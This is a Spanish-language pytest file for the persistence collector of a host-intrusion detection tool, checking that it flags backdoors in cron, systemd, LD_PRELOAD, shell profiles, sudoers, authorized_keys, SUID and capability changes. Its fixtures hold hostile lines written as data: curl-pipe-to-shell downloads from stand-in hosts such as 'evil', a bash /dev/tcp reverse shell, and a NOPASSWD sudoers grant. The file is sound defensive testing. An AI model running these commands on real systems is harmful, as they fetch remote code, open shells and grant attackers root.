"""Tests del colector de persistencia (SUID/cron/systemd)."""
import os

from centinela.collectors.persistence import PersistenceCollector


def _mk(path, content):
    with open(path, "w") as f:
        f.write(content)
    return str(path)


def test_grep_detecta_curl_pipe_sh(tmp_path):
    p = _mk(tmp_path / "c", "* * * * * root curl http://x/a | sh\n")
    assert "curl" in PersistenceCollector._grep_bad(p)


def test_grep_detecta_reverse_shell(tmp_path):
    p = _mk(tmp_path / "c", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")
    assert PersistenceCollector._grep_bad(p) is not None


def test_grep_ignora_comentarios_y_limpio(tmp_path):
    p = _mk(tmp_path / "c", "# curl http://x | sh\n0 5 * * * root /usr/bin/backup\n")
    assert PersistenceCollector._grep_bad(p) is None


def test_grep_only_filtra_execstart(tmp_path):
    cont = "[Service]\nExecStart=/tmp/.implant\nDescription=curl | sh\n"
    p = _mk(tmp_path / "u.service", cont)
    # Con filtro ExecStart, solo la línea ExecStart cuenta (la Description no).
    hit = PersistenceCollector._grep_bad(p, only=("ExecStart",))
    assert hit and "ExecStart" in hit


def test_suid_bad_location(tmp_path):
    if os.name == "nt":
        return
    b = tmp_path / "x"
    b.write_text("x")
    st = os.lstat(b)
    # Una ruta bajo /tmp es mala ubicación; /usr/bin/sudo no lo es.
    assert PersistenceCollector._suid_bad_location("/tmp/evil", st) is True
    assert PersistenceCollector._suid_bad_location("/usr/bin/sudo", st) is False
    assert PersistenceCollector._suid_bad_location("/usr/bin/.hidden", st) is True


def test_suid_nuevo_se_detecta_contra_baseline(tmp_path):
    if os.name == "nt":
        return
    b = tmp_path / "bin"
    b.write_text("x")
    os.chmod(b, 0o4755)        # SUID
    st = os.lstat(b)
    w = PersistenceCollector(bus=None)
    # Primer escaneo: fija baseline (ubicación legítima simulada) -> sin alerta.
    w._iter_suid = lambda: iter([("/usr/bin/legit", st)])
    assert w._scan_suid(now=1000.0) == []
    # Aparece un binario SUID NUEVO -> alerta crítica.
    w._iter_suid = lambda: iter([("/usr/bin/legit", st),
                                 ("/usr/bin/newdoor", st)])
    evs = w._scan_suid(now=2000.0)
    assert len(evs) == 1 and "NUEVO" in evs[0].message


def test_available_sin_etc_en_windows():
    w = PersistenceCollector(bus=None)
    assert w.available() == (os.name == "posix" and os.path.isdir("/etc"))


# ---- capas nuevas (laberinto) ----
import centinela.collectors.persistence as P


def test_ld_preload_es_critico(tmp_path, monkeypatch):
    f = _mk(tmp_path / "preload", "/tmp/.evil.so\n")
    monkeypatch.setattr(P, "_PRELOAD_FILES", (f,))
    w = PersistenceCollector(bus=None)
    evs = w._scan_preload(now=1.0)
    assert len(evs) == 1 and evs[0].kind == "persistence_ld_preload"
    assert int(evs[0].severity) == 4   # CRITICAL


def test_init_profile_backdoor(tmp_path, monkeypatch):
    f = _mk(tmp_path / "profile", "bash -i >& /dev/tcp/1.2.3.4/9 0>&1\n")
    monkeypatch.setattr(P, "_INIT_FILES", (f,))
    monkeypatch.setattr(P, "_INIT_DIRS", ())
    w = PersistenceCollector(bus=None)
    evs = w._scan_init(now=1.0)
    assert len(evs) == 1 and evs[0].kind == "persistence_init"


def test_dotfile_bashrc_backdoor(tmp_path, monkeypatch):
    _mk(tmp_path / ".bashrc", "curl http://evil/a | bash\n")
    monkeypatch.setattr(PersistenceCollector, "_home_dirs",
                        staticmethod(lambda: [str(tmp_path)]))
    w = PersistenceCollector(bus=None)
    evs = w._scan_dotfiles(now=1.0)
    assert len(evs) == 1 and evs[0].kind == "persistence_profile"


def test_sudoers_nopasswd_all(tmp_path, monkeypatch):
    f = _mk(tmp_path / "sudoers", "eviluser ALL=(ALL) NOPASSWD: ALL\n")
    monkeypatch.setattr(P, "_SUDOERS", (f,))
    monkeypatch.setattr(P, "_SUDOERS_DIRS", ())
    w = PersistenceCollector(bus=None)
    evs = w._scan_sudoers(now=1.0)
    assert len(evs) == 1 and evs[0].kind == "persistence_sudoers"


def test_integrity_baseline_y_modificacion(tmp_path, monkeypatch):
    # Crea dos "binarios" críticos: ls + ps
    ls = tmp_path / "ls"; ls.write_bytes(b"original-ls-binary")
    ps = tmp_path / "ps"; ps.write_bytes(b"original-ps-binary")
    monkeypatch.setattr(P, "_INTEGRITY_BINS", (str(ls), str(ps)))
    w = PersistenceCollector(bus=None)
    # Primer escaneo: fija baseline, no alerta.
    assert w._scan_integrity(now=1.0) == []
    assert w._integ_baseline is not None
    # Modificamos "ls" (troyanización simulada).
    ls.write_bytes(b"original-ls-binary + trojan payload extra")
    evs = w._scan_integrity(now=2.0)
    assert len(evs) == 1
    assert evs[0].kind == "persistence_integrity"
    assert int(evs[0].severity) == 4   # CRITICAL
    assert "MODIFICADO" in evs[0].message


def test_integrity_binario_nuevo_y_desaparecido(tmp_path, monkeypatch):
    a = tmp_path / "a"; a.write_bytes(b"AAAA")
    b = tmp_path / "b"; b.write_bytes(b"BBBB")
    monkeypatch.setattr(P, "_INTEGRITY_BINS", (str(a), str(b)))
    w = PersistenceCollector(bus=None)
    w._scan_integrity(now=1.0)        # baseline con A y B
    a.unlink()                         # A desaparece
    c = tmp_path / "c"; c.write_bytes(b"CCCC")
    monkeypatch.setattr(P, "_INTEGRITY_BINS", (str(a), str(b), str(c)))
    evs = w._scan_integrity(now=2.0)
    kinds = [(e.kind, "DESAPARECE" in e.message, "aparece" in e.message) for e in evs]
    assert any(d for _, d, _ in kinds)
    assert any(n for _, _, n in kinds)


def test_fcaps_baseline_y_nuevo(monkeypatch):
    if not hasattr(os, "getxattr"):
        return
    w = PersistenceCollector(bus=None)
    snaps = iter([{"/usr/bin/python3"},
                  {"/usr/bin/python3", "/tmp/.implant"}])
    monkeypatch.setattr(PersistenceCollector, "_fcaps_snapshot",
                        lambda self: next(snaps))
    assert w._scan_fcaps(now=1.0) == []           # fija baseline
    evs = w._scan_fcaps(now=2.0)
    assert len(evs) == 1 and evs[0].kind == "persistence_fcaps"
    assert int(evs[0].severity) == 4              # /tmp -> CRITICAL


def test_drop_privileges_devuelve_tupla():
    from centinela.security import drop_privileges, layers_need_sustained_root
    ok, why = drop_privileges("nobody")
    assert isinstance(ok, bool) and isinstance(why, str)

    class A:
        respond_live = True; rootcheck = False; netwatch = False
    need = layers_need_sustained_root(A())
    assert need and "respond-live" in need[0]


def test_authkeys_forced_command(tmp_path, monkeypatch):
    if os.name == "nt":
        return
    ssh = tmp_path / ".ssh"
    ssh.mkdir()
    _mk(ssh / "authorized_keys",
        'command="curl http://evil|sh" ssh-rsa AAAA user@h\n')
    monkeypatch.setattr(PersistenceCollector, "_home_dirs",
                        staticmethod(lambda: [str(tmp_path)]))
    w = PersistenceCollector(bus=None)
    evs = w._scan_authkeys(now=1.0)
    assert any(e.kind == "persistence_authkeys" for e in evs)
